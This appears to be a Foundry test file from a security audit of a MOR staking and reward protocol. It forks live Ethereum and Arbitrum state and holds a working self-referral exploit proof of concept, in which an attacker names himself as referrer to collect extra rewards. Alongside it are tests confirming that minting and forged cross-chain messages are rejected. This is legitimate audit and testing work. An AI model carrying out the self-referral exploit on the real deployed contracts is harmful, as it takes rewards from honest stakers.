// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IStETH {
    function submit(address) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256, uint256, uint128, address) external;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getLatestReferrerReward(uint256, address) external view returns (uint256);
    function claimReferrerTier(uint256, address) external payable;
    function rewardPoolsData(uint256) external view returns (uint128, uint256, uint256);
}

interface IDistributor {
    function distributeRewards(uint256) external;
    function supply(uint256, address, uint256) external returns (uint256);
    function getDistributedRewards(uint256, address) external view returns (uint256);
}

interface IChainLinkDataConsumer {
    function getPathId(string memory) external pure returns (bytes32);
    function dataFeeds(bytes32, uint256) external view returns (address);
}

interface IAggregator {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

interface IMOR {
    function mint(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IL1Sender {
    function sendMintMessage(address, uint256, address) external payable;
}

interface IL2MessageReceiver {
    function lzReceive(uint16, bytes memory, uint64, bytes memory) external;
    function config() external view returns (address, address, uint16);
    function failedMessages(uint16, bytes memory, uint64) external view returns (bytes32);
}

contract CapitalTest is Test {
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant MOR_ETH = 0xcBB8f1BDA10b9696c57E13BC128Fe674769DCEc0;
    address constant MOR_ARB = 0x092bAaDB7DEf4C3981454dD9c0A0D7FF07bCFc86;
    address constant L2MR = 0xd4a8ECcBe696295e68572A98b1aA70Aa9277d427;
    address constant L1SENDER = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;
    address constant CLDC = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    uint256 constant ETH_FORK_BLOCK = 26430188;
    uint256 constant ARB_FORK_BLOCK = 524856767;

    address attacker;
    address control;

    function setUp() public {
        vm.createSelectFork("mainnet", ETH_FORK_BLOCK);
        attacker = makeAddr("attacker");
        control = makeAddr("control");
    }

    /// @notice After a warp the real ChainLink answers are stale, so
    /// distributeRewards would revert on price == 0. Re-serve every feed
    /// used by reward pool 0 with its live answer but a fresh updatedAt.
    function _freshFeeds() internal {
        string[5] memory paths = [
            "stETH/USD",
            "wBTC/BTC,BTC/USD",
            "wETH/USD",
            "USDC/USD",
            "USDT/USD"
        ];
        for (uint256 p = 0; p < paths.length; p++) {
            bytes32 pathId = IChainLinkDataConsumer(CLDC).getPathId(paths[p]);
            for (uint256 i = 0; ; i++) {
                address feed;
                try IChainLinkDataConsumer(CLDC).dataFeeds(pathId, i) returns (address f) {
                    feed = f;
                } catch {
                    break;
                }
                (uint80 rid, int256 answer, , , uint80 ansIn) = IAggregator(feed).latestRoundData();
                uint8 dec = IAggregator(feed).decimals();
                vm.mockCall(
                    feed,
                    abi.encodeWithSelector(IAggregator.latestRoundData.selector),
                    abi.encode(rid, answer, block.timestamp, block.timestamp, ansIn)
                );
                vm.mockCall(
                    feed,
                    abi.encodeWithSelector(IAggregator.decimals.selector),
                    abi.encode(dec)
                );
            }
        }
    }

    function _stakeSteth(address who, uint256 amount, address referrer) internal {
        vm.deal(who, amount);
        vm.prank(who);
        IStETH(STETH).submit{value: amount}(address(0));
        uint256 bal = IStETH(STETH).balanceOf(who);
        assertGe(bal, amount - 1e15, "stETH mint shortfall");
        vm.prank(who);
        IStETH(STETH).approve(DIST, type(uint256).max);
        vm.prank(who);
        IDepositPool(STETH_POOL).stake(0, amount, 0, referrer);
    }

    /// @notice H-001 candidate: self-referral. The attacker names himself as
    /// referrer, so the same 100 stETH earns a user share AND a referrer
    /// share (10% tier, 25 stETH threshold) of the fixed daily MOR emission.
    function testSelfReferralDilution() public {
        _stakeSteth(attacker, 100 ether, attacker);
        _stakeSteth(control, 100 ether, address(0));

        uint256 aUser0 = IDepositPool(STETH_POOL).getLatestUserReward(0, attacker);
        uint256 aRef0 = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        uint256 bUser0 = IDepositPool(STETH_POOL).getLatestUserReward(0, control);
        assertEq(aRef0, 0, "referrer reward nonzero before distribution");
        assertEq(bUser0, aUser0, "user rewards differ before distribution");

        vm.warp(block.timestamp + 15 days);
        _freshFeeds();
        IDistributor(DIST).distributeRewards(0);

        uint256 aUser = IDepositPool(STETH_POOL).getLatestUserReward(0, attacker);
        uint256 aRef = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        uint256 bUser = IDepositPool(STETH_POOL).getLatestUserReward(0, control);
        uint256 bRef = IDepositPool(STETH_POOL).getLatestReferrerReward(0, control);

        uint256 aTotal = aUser + aRef;
        uint256 bTotal = bUser + bRef;

        console.log("attacker user MOR:", aUser);
        console.log("attacker referrer MOR:", aRef);
        console.log("attacker total MOR:", aTotal);
        console.log("control user MOR:", bUser);
        console.log("control referrer MOR:", bRef);
        console.log("control total MOR:", bTotal);
        console.log("extra MOR to self-referrer:", aTotal - bTotal);

        assertEq(bRef, 0, "control should have no referrer reward");
        assertGt(aRef, 0, "self-referrer earned no referrer reward");
        assertGt(aTotal, bTotal, "self-referral did not increase claimable MOR");
        // The extra is material in MOR terms (tens of MOR over 15 days).
        assertGt(aTotal - bTotal, 10 ether, "extra MOR too small to matter");
    }

    /// @notice The referrer claim path actually executes: it pays the
    /// LayerZero fee and forwards the mint message for the exact amount.
    function testReferrerClaimExecutes() public {
        _stakeSteth(attacker, 100 ether, attacker);
        vm.warp(block.timestamp + 15 days);
        _freshFeeds();
        IDistributor(DIST).distributeRewards(0);

        uint256 pending = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        assertGt(pending, 0, "no referrer reward to claim");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        IDepositPool(STETH_POOL).claimReferrerTier{value: 0.5 ether}(0, attacker);

        assertEq(IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker), 0, "reward not zeroed after claim");
        console.log("referrer MOR claimed via LZ message:", pending);
    }

    /// @notice Unprivileged MOR minting reverts: mint needs isMinter, and no
    /// unprivileged address holds it.
    function testUnprivilegedMorMintReverts() public {
        vm.prank(attacker);
        vm.expectRevert("MOROFT: invalid caller");
        IMOR(MOR_ETH).mint(attacker, 1_000_000 ether);
    }

    /// @notice Distributor entry points reject callers that are not a
    /// registered DepositPool.
    function testDistributorRejectsNonPoolCaller() public {
        vm.prank(attacker);
        vm.expectRevert("DR: deposit pool doesn't exist");
        IDistributor(DIST).supply(0, attacker, 1 ether);
    }

    /// @notice L1Sender only accepts mint messages from the Distributor.
    function testL1SenderRejectsNonDistributor() public {
        vm.prank(attacker);
        vm.expectRevert("L1S: the `msg.sender` isn't `distributor`");
        IL1Sender(L1SENDER).sendMintMessage(attacker, 1 ether, attacker);
    }
}

contract L2MessageReceiverTest is Test {
    address constant MOR_ARB = 0x092bAaDB7DEf4C3981454dD9c0A0D7FF07bCFc86;
    address constant L2MR = 0xd4a8ECcBe696295e68572A98b1aA70Aa9277d427;
    address constant L1SENDER = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;

    uint256 constant ARB_FORK_BLOCK = 524856767;

    function setUp() public {
        // No pinned block: arbitrum.publicnode.com rejects archive
        // requests without a token, latest state is served fine.
        vm.createSelectFork("arbitrum");
    }

    /// @notice Positive control: a genuine LayerZero delivery from the L1
    /// sender mints exactly the payload amount to the user.
    function testGenuineLzDeliveryMintsExactAmount() public {
        (address gateway, address sender, uint16 senderChainId) = IL2MessageReceiver(L2MR).config();
        assertEq(senderChainId, 101, "unexpected sender chain id");
        assertEq(sender, L1SENDER, "unexpected configured sender");

        address user = makeAddr("l2user");
        uint256 amount = 123 ether;
        uint256 before = IMOR(MOR_ARB).balanceOf(user);

        bytes memory src = abi.encodePacked(sender, L2MR);
        vm.prank(gateway);
        IL2MessageReceiver(L2MR).lzReceive(senderChainId, src, 1, abi.encode(user, amount));

        assertEq(IMOR(MOR_ARB).balanceOf(user) - before, amount, "minted amount differs from payload");
    }

    /// @notice Direct calls to lzReceive from anyone but the LayerZero
    /// endpoint revert.
    function testLzReceiveRejectsNonGateway() public {
        address attacker = makeAddr("attacker");
        bytes memory src = abi.encodePacked(L1SENDER, L2MR);
        vm.prank(attacker);
        vm.expectRevert("L2MR: invalid gateway");
        IL2MessageReceiver(L2MR).lzReceive(101, src, 1, abi.encode(attacker, 1_000_000 ether));
    }

    /// @notice A delivery through the real gateway but with a forged sender
    /// does not mint: it is recorded as failed, no MOR is created.
    function testForgedSenderDoesNotMint() public {
        (address gateway, , uint16 senderChainId) = IL2MessageReceiver(L2MR).config();
        address attacker = makeAddr("attacker");
        uint256 before = IMOR(MOR_ARB).balanceOf(attacker);

        bytes memory forgedSrc = abi.encodePacked(attacker, L2MR);
        vm.prank(gateway);
        IL2MessageReceiver(L2MR).lzReceive(senderChainId, forgedSrc, 7, abi.encode(attacker, 1_000_000 ether));

        assertEq(IMOR(MOR_ARB).balanceOf(attacker), before, "forged sender minted MOR");
        assertTrue(
            IL2MessageReceiver(L2MR).failedMessages(senderChainId, forgedSrc, 7) != bytes32(0),
            "forged message was not recorded as failed"
        );
    }

    /// @notice Same for a wrong source chain id.
    function testWrongChainIdDoesNotMint() public {
        (address gateway, , ) = IL2MessageReceiver(L2MR).config();
        address attacker = makeAddr("attacker");
        uint256 before = IMOR(MOR_ARB).balanceOf(attacker);

        bytes memory src = abi.encodePacked(L1SENDER, L2MR);
        vm.prank(gateway);
        IL2MessageReceiver(L2MR).lzReceive(102, src, 8, abi.encode(attacker, 1_000_000 ether));

        assertEq(IMOR(MOR_ARB).balanceOf(attacker), before, "wrong chain id minted MOR");
    }
}
